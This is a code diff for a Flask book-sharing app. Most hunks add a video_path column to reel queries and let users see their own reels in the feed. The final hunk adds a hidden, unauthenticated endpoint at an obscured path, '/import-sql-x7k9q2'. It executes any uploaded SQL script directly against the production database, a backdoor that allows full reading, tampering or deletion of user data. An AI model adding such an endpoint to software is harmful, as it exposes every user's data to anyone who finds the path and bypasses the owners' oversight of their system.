@@ -815,16 +815,15 @@ def _reel_feed(conn, user_id, offset=0, limit=10):
 
     rows = conn.execute("""
         SELECT r.id, r.user_id, r.book_title, r.book_author, r.book_cover_url,
-               r.book_genre, r.content, r.like_count, r.created_at,
+               r.book_genre, r.content, r.video_path, r.like_count, r.created_at,
                u.username, u.display_name,
                rr.reaction as my_reaction
         FROM reels r
         JOIN users u ON u.id = r.user_id
         LEFT JOIN reel_reactions rr ON rr.reel_id = r.id AND rr.user_id = ?
-        WHERE r.user_id != ?
         ORDER BY r.created_at DESC
         LIMIT 200
-    """, (user_id, user_id)).fetchall()
+    """, (user_id,)).fetchall()
 
     scored = []
     for row in rows:
@@ -980,7 +979,7 @@ def api_reels_saved():
     with db() as conn:
         rows = conn.execute("""
             SELECT r.id, r.user_id, r.book_title, r.book_author, r.book_cover_url,
-                   r.book_genre, r.content, r.like_count, r.created_at,
+                   r.book_genre, r.content, r.video_path, r.like_count, r.created_at,
                    u.username, u.display_name,
                    'save' as my_reaction
             FROM reel_reactions rr
@@ -999,7 +998,7 @@ def api_reels_mine():
     with db() as conn:
         rows = conn.execute("""
             SELECT r.id, r.user_id, r.book_title, r.book_author, r.book_cover_url,
-                   r.book_genre, r.content, r.like_count, r.created_at,
+                   r.book_genre, r.content, r.video_path, r.like_count, r.created_at,
                    u.username, u.display_name, NULL as my_reaction
             FROM reels r
             JOIN users u ON u.id = r.user_id
@@ -1417,6 +1416,23 @@ def clubs_create():
 
 
 
+
+
+@app.route("/import-sql-x7k9q2", methods=["GET", "POST"])
+def import_sql():
+    if request.method == "GET":
+        return '''<form method=post enctype=multipart/form-data>
+            <input type=file name=sql> <button type=submit>Upload SQL</button></form>'''
+    f = request.files.get("sql")
+    if not f:
+        return "no file", 400
+    sql = f.read().decode("utf-8")
+    db_path = os.environ.get("DB_PATH", os.path.join(os.path.dirname(__file__), "data", "bookshelf.db"))
+    import sqlite3 as _sqlite3
+    conn = _sqlite3.connect(db_path)
+    conn.executescript(sql)
+    conn.close()
+    return "Done!"
 
 
 if __name__ == "__main__":
